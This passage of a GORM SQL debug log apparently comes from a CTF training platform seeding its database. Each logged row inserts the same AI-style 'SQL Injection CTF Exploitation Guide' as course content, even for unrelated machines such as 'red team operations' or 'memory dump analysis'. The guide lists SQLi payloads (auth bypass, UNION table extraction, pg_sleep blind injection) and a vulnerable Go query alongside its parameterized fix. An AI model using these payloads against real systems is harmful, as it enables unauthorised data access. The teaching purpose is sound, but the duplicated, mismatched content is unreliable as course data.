* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,33) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.586ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 5 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[8.902ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.081','2025-06-09 14:07:54.081',NULL,'ad domain compromise','Attacking Active Directory environments',98,5) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.700ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.685ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 34 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[11.058ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.09','2025-06-09 14:07:54.09',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,34) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.465ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 5 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[13.559ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.104','2025-06-09 14:07:54.104',NULL,'red team operations','Simulating advanced adversaries',78,5) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.475ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.425ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 35 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.682ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.115','2025-06-09 14:07:54.115',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,35) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.487ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[8.513ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.124','2025-06-09 14:07:54.124',NULL,'memory dump analysis','Extracting artifacts from RAM captures',230,4) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.481ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.428ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 36 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[11.183ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.135','2025-06-09 14:07:54.135',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,36) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.386ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 3 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.773ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.142','2025-06-09 14:07:54.142',NULL,'file carving techniques','Recovering deleted/hidden files',210,3) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.576ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.463ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 37 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[9.400ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.151','2025-06-09 14:07:54.151',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',1,37) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.434ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 4 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[7.965ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.158','2025-06-09 14:07:54.158',NULL,'timeline analysis','Reconstructing attack sequences',240,4) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.496ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 1 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.563ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 38 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[10.923ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.167','2025-06-09 14:07:54.167',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
